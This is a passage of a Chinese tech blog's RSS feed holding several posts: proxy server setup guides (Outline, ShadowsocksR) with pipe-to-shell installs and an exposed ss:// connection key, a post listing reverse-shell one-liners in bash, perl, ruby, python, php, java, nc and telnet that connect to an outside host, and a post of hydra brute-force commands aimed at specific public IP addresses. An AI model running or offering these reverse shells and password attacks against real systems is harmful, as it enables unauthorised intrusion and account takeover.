  &lt;li&gt;nginx，&lt;a href=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190606/default_full&quot;&gt;点击下载&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;v2ray，&lt;a href=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190606/config_full.json&quot;&gt;点击下载&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>  
               <pubDate>Thu, 06 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/v2ray-build/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/v2ray-build/</guid>  
               </item>  
          
            <item>  
               <title>旅行必备 Outline 搭建与使用</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-简介&quot; id=&quot;markdown-toc-1-简介&quot;&gt;1. 简介&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-创建实例&quot; id=&quot;markdown-toc-2-创建实例&quot;&gt;2. 创建实例&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-一键安装&quot; id=&quot;markdown-toc-3-一键安装&quot;&gt;3. 一键安装&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-outline-manager&quot; id=&quot;markdown-toc-4-outline-manager&quot;&gt;4. outline manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-outline-client&quot; id=&quot;markdown-toc-5-outline-client&quot;&gt;5. outline client&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1-简介&quot;&gt;1. 简介&lt;/h2&gt;

&lt;p&gt;Outline 基于ss的开源软件，出自于Jigsaw公司，Jigsaw公司前身是Google Ideas，是Google旗下的技术孵化器公司，目标是以技术来克服全球的网络安全难题，
包括地址网络审查制度、降低网络攻击的威胁，以及防止大众收到网络骚扰等。Outline即为Jigsaw的成果之一。&lt;/p&gt;

&lt;h2 id=&quot;2-创建实例&quot;&gt;2. 创建实例&lt;/h2&gt;

&lt;p&gt;参考 &lt;a href=&quot;//wangjun.dev/2019/06/ssr-build/&quot;&gt;旅行必备 ShadowsocketR 搭建与使用&lt;/a&gt; 中的创建实例。&lt;/p&gt;

&lt;h2 id=&quot;3-一键安装&quot;&gt;3. 一键安装&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; https://get.docker.com/ | sh
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl start docker
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;docker
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl status docker
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-qO-&lt;/span&gt; https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_scripts/install_server.sh | bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从上述命令可见 outline 的server环境是基于 docker 来做的，首先安装 docker 容器，启动、设置开机自启动、查看启动状态，执行一键脚本安装。
执行完后会输出一段 json 格式的内容，其实就是一个连接服务端的加密串，将它复制保存到记事本中，后续需要使用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x255?text=&amp;quot;&amp;quot;&quot; alt=&quot;outline-result&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/outline-result.png&quot; /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;这里需要注意的是端口号是否在防火墙规则中&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;4-outline-manager&quot;&gt;4. outline manager&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x740?text=&amp;quot;&amp;quot;&quot; alt=&quot;outline-manager&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/outline-manager.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击下载 &lt;a href=&quot;https://github.com/Jigsaw-Code/outline-server/releases&quot;&gt;outline manager&lt;/a&gt; 并安装，将上面输出的 json 加密串配置在 outline manager 中，
启动并点击钥匙按钮获取连接key，类似如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ss://Y2hhY2hhMjAtaWV0Zi1wb2x5MTMwNTpETVdTQUlSbFN6dWc=@34.92.208.222:54320/?outline=1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;5-outline-client&quot;&gt;5. outline client&lt;/h2&gt;

&lt;p&gt;点击下载 &lt;a href=&quot;https://github.com/Jigsaw-Code/outline-client/releases&quot;&gt;outline client&lt;/a&gt;，根据自己系统自行按照，使用上一步的key添加连接，保存并启动即可。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/527x762?text=&amp;quot;&amp;quot;&quot; alt=&quot;outline-client&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/outline-client.png&quot; /&gt;&lt;/p&gt;

</description>  
               <pubDate>Thu, 06 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/outline-build/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/outline-build/</guid>  
               </item>  
          
            <item>  
               <title>旅行必备 ShadowsocketR 搭建与使用</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#谨此说明&quot; id=&quot;markdown-toc-谨此说明&quot;&gt;谨此说明&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-环境准备&quot; id=&quot;markdown-toc-1-环境准备&quot;&gt;1. 环境准备&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-创建实例&quot; id=&quot;markdown-toc-2-创建实例&quot;&gt;2. 创建实例&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-执行安装&quot; id=&quot;markdown-toc-3-执行安装&quot;&gt;3. 执行安装&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-配置防火墙&quot; id=&quot;markdown-toc-4-配置防火墙&quot;&gt;4. 配置防火墙&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-客户端链接&quot; id=&quot;markdown-toc-5-客户端链接&quot;&gt;5. 客户端链接&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;谨此说明&quot;&gt;谨此说明&lt;/h2&gt;

&lt;p&gt;目前 github 上的 shadowsocketR 作者出于某些大家都知道的原因早已不在更新，稳定版本保持在3.2.2上，为了保证后续正常使用，已经fock到自己的仓库中，
一键安装脚本也独立在自己的 github 中进行维护。&lt;/p&gt;

&lt;h2 id=&quot;1-环境准备&quot;&gt;1. 环境准备&lt;/h2&gt;

&lt;p&gt;可以选择的服务器环境很多，推荐使用 &lt;a href=&quot;https://www.vultr.com/?ref=7472300&quot;&gt;vultr&lt;/a&gt; 和 &lt;a href=&quot;https://cloud.google.com/&quot;&gt;google cloud&lt;/a&gt;，这里
使用 google 云为例。&lt;/p&gt;

&lt;h2 id=&quot;2-创建实例&quot;&gt;2. 创建实例&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x517?text=&amp;quot;&amp;quot;&quot; alt=&quot;create-vm&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/create-vm.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;配置说明：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;名称&lt;/strong&gt;，随意，起一个自定义的&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;区域&lt;/strong&gt;，就近原则，亚洲的都可，这里选择香港-区域c&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;机器类型&lt;/strong&gt;，最小配置，微型共享CPU&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;启动磁盘&lt;/strong&gt;，默认debian9&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;防火墙&lt;/strong&gt;，全部勾选&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其他保持默认，点击创建&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x517?text=&amp;quot;&amp;quot;&quot; alt=&quot;create-vm-result&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/create-vm-result.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;创建完成后，记住分配的公网IP，测试下这个IP的延时以决定是否用此实例（此步骤可选）。浏览器打开 &lt;a href=&quot;https://tools.ipip.net/traceroute.php&quot;&gt;ipip.net&lt;/a&gt;，
输入当前的带宽路径和刚才分配的公网IP，点击查看延时性，基本上高于100ms可以选择不要重新创建实例。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x517?text=&amp;quot;&amp;quot;&quot; alt=&quot;check-ip&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/check-ip.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-执行安装&quot;&gt;3. 执行安装&lt;/h2&gt;

&lt;p&gt;SSH 打开刚才创建的虚拟机，执行以下命令创建 ShadowsocketR 服务，期间记住输入的&lt;strong&gt;密码&lt;/strong&gt;和&lt;strong&gt;端口号&lt;/strong&gt;，其他保持默认&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 切换root权限&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 下载一键安装脚本&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;--no-check-certificate&lt;/span&gt; https://raw.githubusercontent.com/wangjunneil/one-key-script/master/shadowsocksR.sh

&lt;span class=&quot;c&quot;&gt;# 赋予权限并执行一键安装脚本&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x shadowsocksR.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./shadowsocksR.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;脚本执行完成后，会显示最终的 SSR 链接信息，如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x354?text=&amp;quot;&amp;quot;&quot; alt=&quot;ssr-result&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/ssr-result.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-配置防火墙&quot;&gt;4. 配置防火墙&lt;/h2&gt;

&lt;p&gt;在创建实例时勾选的 http 和 https 已默认开通 80 和 443端口，这里 shadownsocketR 服务用的端口是 5001，需要在防火墙中允许 5001 端口的出入栈规则。
在 Google 云控制台点击 VPC 网络 - 防火墙规则，点击创建防火墙规则。名称随意，&lt;strong&gt;来源 IP 地址范围&lt;/strong&gt;使用 &lt;strong&gt;0.0.0.0/0&lt;/strong&gt;，&lt;strong&gt;协议和端口&lt;/strong&gt;将5001端口的
tcp和udp都开通，其他默认，具体如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x515?text=&amp;quot;&amp;quot;&quot; alt=&quot;fire-rule&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/fire-rule.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;5-客户端链接&quot;&gt;5. 客户端链接&lt;/h2&gt;

&lt;p&gt;本地下载安装 SSR 客户端：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;MacOS，&lt;a href=&quot;//github.com/shadowsocks/ShadowsocksX-NG/releases/download/v1.8.2/ShadowsocksX-NG.app.1.8.2.zip&quot;&gt;点击下载&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Windows，&lt;a href=&quot;//github.com/shadowsocks/shadowsocks-windows/releases/download/4.1.6/Shadowsocks-4.1.6.zip&quot;&gt;点击下载&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里以 MacOS 客户端为例子&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x513?text=&amp;quot;&amp;quot;&quot; alt=&quot;client-connect&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/client-connect.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;至此，所有操作已经完成，只需要在本地配置好连接即可国际旅游&lt;/p&gt;
</description>  
               <pubDate>Wed, 05 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/ssr-build/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/ssr-build/</guid>  
               </item>  
          
            <item>  
               <title>触发反向 shell 的多种方式获取控制权</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#原理&quot; id=&quot;markdown-toc-原理&quot;&gt;原理&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#启动监听&quot; id=&quot;markdown-toc-启动监听&quot;&gt;启动监听&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#反向连接&quot; id=&quot;markdown-toc-反向连接&quot;&gt;反向连接&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/748x370?text=&amp;quot;&amp;quot;&quot; alt=&quot;metasploit&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/1512862_1adf.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;原理&quot;&gt;原理&lt;/h2&gt;

&lt;p&gt;正向连接获取shell的方式早已不是主流，很容易被防火墙或者杀毒软件监控到，除非是正常的授权操作方式。反向连接原理是攻击者启动监听服务，等待被攻击者主动连接从而获取shell，连接通常是建立 &lt;strong&gt;/bin/bash&lt;/strong&gt; 或者 &lt;strong&gt;cmd&lt;/strong&gt; 的通道。&lt;/p&gt;

&lt;h2 id=&quot;启动监听&quot;&gt;启动监听&lt;/h2&gt;

&lt;p&gt;使用 metasploit 常规监听方式&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/multi/handler
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;handler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload generic/shell_reverse_tcp
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;handler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ...... &lt;span class=&quot;c&quot;&gt;# 设置监听参数&lt;/span&gt;
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;handler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;反向连接&quot;&gt;反向连接&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# bash&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/tcp/m1d8457118.iok.la/12832 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1

&lt;span class=&quot;c&quot;&gt;# perl&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl &lt;span class=&quot;nt&quot;&gt;-MIO&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;m1d8457118.iok.la:12832&quot;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ruby&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby &lt;span class=&quot;nt&quot;&gt;-rsocket&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exit if fork;c=TCPSocket.new(&quot;m1d8457118.iok.la&quot;,&quot;12832&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# python&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;m1d8457118.iok.la&quot;,12832));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;php &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$sock=fsockopen(&quot;m1d8457118.iok.la&quot;,12832);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# java&lt;/span&gt;
r &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Runtime.getRuntime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
p &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; r.exec&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;-c&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;exec 5&amp;lt;&amp;gt;/dev/tcp/m1d8457118.iok.la/12832;cat &amp;lt;&amp;amp;5 | while read line; do &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; as String[]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
p.waitFor&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# nc&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/sh m1d8457118.iok.la 12832
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/sh | nc m1d8457118.iok.la 12832 &lt;span class=&quot;c&quot;&gt;# -e 选项被禁用的情况&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# telnet&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mknod &lt;/span&gt;backpipe p &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; telnet m1d8457118.iok.la 12832 0&amp;lt;backpipe | /bin/bash 1&amp;gt;backpipe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>  
               <pubDate>Wed, 05 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/reversh-shell-way/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/reversh-shell-way/</guid>  
               </item>  
          
            <item>  
               <title>老牌暴力破解工具 hydra 的使用</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#说明&quot; id=&quot;markdown-toc-说明&quot;&gt;说明&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#使用&quot; id=&quot;markdown-toc-使用&quot;&gt;使用&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;
![xhygra](//via.placeholder.com/300x300?text=&quot;&quot;){: data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/xhydra.png&quot;}
&lt;/p&gt;

&lt;h2 id=&quot;说明&quot;&gt;说明&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;//github.com/vanhauser-thc/thc-hydra&quot;&gt;Hydra&lt;/a&gt; 是比较常规的暴力破解工具，支持多种协议，如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Cisco AAA, Cisco auth, Cisco enable, CVS, FTP, HTTP(S)-FORM-GET, HTTP(S)-FORM-POST, HTTP(S)-GET, HTTP(S)-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MySQL, NNTP, Oracle Listener, Oracle SID, PC-Anywhere, PC-NFS, POP3, PostgreSQL, RDP, Rexec, Rlogin, Rsh, SIP, SMB(NT), SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;使用&quot;&gt;使用&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ssh&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password.lst &lt;span class=&quot;nt&quot;&gt;-vV&lt;/span&gt; ssh://139.196.15.128:4322

&lt;span class=&quot;c&quot;&gt;# ftp&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password.lst &lt;span class=&quot;nt&quot;&gt;-vV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 10 ftp://14.23.48.233

&lt;span class=&quot;c&quot;&gt;# mysql&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password.lst &lt;span class=&quot;nt&quot;&gt;-vV&lt;/span&gt; 113.109.217.131 mysql

&lt;span class=&quot;c&quot;&gt;# telnet&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; administrator password.lst &lt;span class=&quot;nt&quot;&gt;-vV&lt;/span&gt; telnet://125.216.34.132

&lt;span class=&quot;c&quot;&gt;#vnc&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; passwordlist &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 5 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 5901 192.168.100.155 vnc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# web login&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Examples:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;/login.php:user=^USER^&amp;amp;pass=^PASS^:incorrect&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;/login.php:user=^USER^&amp;amp;pass=^PASS^&amp;amp;colon=colon\:escape:S=authlog=.*success&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;/login.php:user=^USER^&amp;amp;pass=^PASS^&amp;amp;mid=123:authlog=.*failed&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;/:user=^USER&amp;amp;pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra 192.168.100.155 &lt;span class=&quot;nt&quot;&gt;-V&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; passwordlist http-get-form &lt;span class=&quot;s2&quot;&gt;&quot;/dvwa/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>  
               <pubDate>Wed, 05 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/hydra-brute-force/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/hydra-brute-force/</guid>  
               </item>  
          
            <item>  
               <title>开源免费的 SSL 证书汇总</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-google-mkcert&quot; id=&quot;markdown-toc-1-google-mkcert&quot;&gt;1. Google Mkcert&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#11-安装&quot; id=&quot;markdown-toc-11-安装&quot;&gt;1.1. 安装&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12-生成&quot; id=&quot;markdown-toc-12-生成&quot;&gt;1.2. 生成&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#13-使用&quot; id=&quot;markdown-toc-13-使用&quot;&gt;1.3. 使用&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-lets-encrypt&quot; id=&quot;markdown-toc-2-lets-encrypt&quot;&gt;2. Let’s Encrypt&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-安装&quot; id=&quot;markdown-toc-21-安装&quot;&gt;2.1. 安装&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#21-使用&quot; id=&quot;markdown-toc-21-使用&quot;&gt;2.1. 使用&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-续订&quot; id=&quot;markdown-toc-22-续订&quot;&gt;2.2. 续订&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1-google-mkcert&quot;&gt;1. Google Mkcert&lt;/h2&gt;

